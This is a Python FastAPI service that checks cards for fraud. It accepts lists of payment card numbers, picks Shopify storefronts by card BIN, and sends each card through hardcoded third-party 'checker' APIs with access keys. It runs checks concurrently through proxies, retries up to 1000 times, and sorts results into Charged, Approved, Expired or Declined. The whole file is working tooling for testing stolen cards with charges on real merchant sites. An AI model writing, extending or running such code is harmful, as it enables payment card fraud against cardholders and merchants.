from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import aiohttp
import asyncio
import os
import random
import json

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SHOPIFY_APIS = {
    "api1": {"url": "https://api-production-6b6d.up.railway.app/shopify", "key": "darkanon"},
    "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
}

# Load sites from JSON file
SITES_FILE = os.path.join(os.path.dirname(__file__), "sites.json")

def load_sites():
    try:
        with open(SITES_FILE, "r") as f:
            return json.load(f)
    except:
        return {"sites": ["https://the-butterfly-pig-dev.myshopify.com"], "filters": {}}

def get_site_for_card(card, sites_data):
    """Pick a site based on card type (BIN filter)"""
    cc = card.split("|")[0].strip()
    filters = sites_data.get("filters", {})
    
    # Detect card type from first digits
    if cc.startswith("4"):
        # Visa
        if cc[1:3] in ["22", "23", "24", "25", "26", "27"]:
            return filters.get("visa_debit", sites_data.get("sites", []))
        return filters.get("default", sites_data.get("sites", []))
    elif cc.startswith("5"):
        return filters.get("mastercard", sites_data.get("sites", []))
    elif cc.startswith("3"):
        return filters.get("amex", sites_data.get("sites", []))
    
    return filters.get("default", sites_data.get("sites", []))

@app.post("/check")
async def check_cards(data: dict):
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    sites_data = load_sites()
    
    results = []
    checked = 0
    charged = 0
    approved = 0
    dead = 0
    
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait({"card": card, "site": site})
    
    semaphore = asyncio.Semaphore(concurrency)
    
    async def worker():
        nonlocal checked, charged, approved, dead
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while not queue.empty():
                try:
                    item = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                card = item["card"]
                
                async with semaphore:
                    result = await check_card_forever(session, api, card, sites_data)
                    results.append(result)
                    checked += 1
                    if result["status"] == "Charged":
                        charged += 1
                    elif result["status"] == "Approved":
                        approved += 1
                    elif result["status"] in ["Declined", "Expired"]:
                        dead += 1
                
                queue.task_done()
    
    workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
    await asyncio.gather(*workers)
    
    return {
        "results": results,
        "total": len(results),
        "checked": checked,
        "charged": charged,
        "approved": approved,
        "dead": dead,
        "concurrency_used": concurrency,
        "api_used": api_name
    }

async def check_card_forever(session, api, card, sites_data):
    """Keep trying different sites until we get a VALID response"""
    
    # Get filtered sites for this card
    available_sites = get_site_for_card(card, sites_data)
    if not available_sites:
        available_sites = sites_data.get("sites", ["https://the-butterfly-pig-dev.myshopify.com"])
    
    attempt = 0
    site_index = 0
    
    while True:
        attempt += 1
        # Rotate through sites
        current_site = available_sites[site_index % len(available_sites)]
        site_index += 1
        
        try:
            url = f"{api['url']}?site={current_site}&cc={card}&key={api['key']}"
            
            async with session.get(url) as resp:
                text = await resp.text()
                
                # Try to parse JSON response
                try:
                    data = json.loads(text)
                    response_text = data.get('Response', text).lower()
                except:
                    response_text = text.lower()
                
                # Check if this is a VALID final response
                if 'charged' in response_text and 'no_product' not in response_text:
                    return {
                        "card": card,
                        "status": "Charged",
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "site": current_site,
                        "attempts": attempt
                    }
                elif 'approved' in response_text:
                    return {
                        "card": card,
                        "status": "Approved",
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "site": current_site,
                        "attempts": attempt
                    }
                elif 'expired' in response_text:
                    return {
                        "card": card,
                        "status": "Expired",
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "site": current_site,
                        "attempts": attempt
                    }
                elif 'card_declined' in response_text or 'declined' in response_text:
                    return {
                        "card": card,
                        "status": "Declined",
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "site": current_site,
                        "attempts": attempt
                    }
                
                # NOT valid -> try next site
                await asyncio.sleep(0.3)
                continue
        
        except Exception as e:
            if attempt > 1000:
                return {
                    "card": card,
                    "status": "Error",
                    "message": str(e)[:200],
                    "gateway": "Shopify",
                    "price": "-",
                    "site": current_site,
                    "attempts": attempt
                }
            await asyncio.sleep(0.3)
            continue

def extract_price(text):
    import re
    prices = re.findall(r'\$(\d+\.?\d*)', text)
    return prices[0] if prices else "-"

@app.get("/health")
async def health():
    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
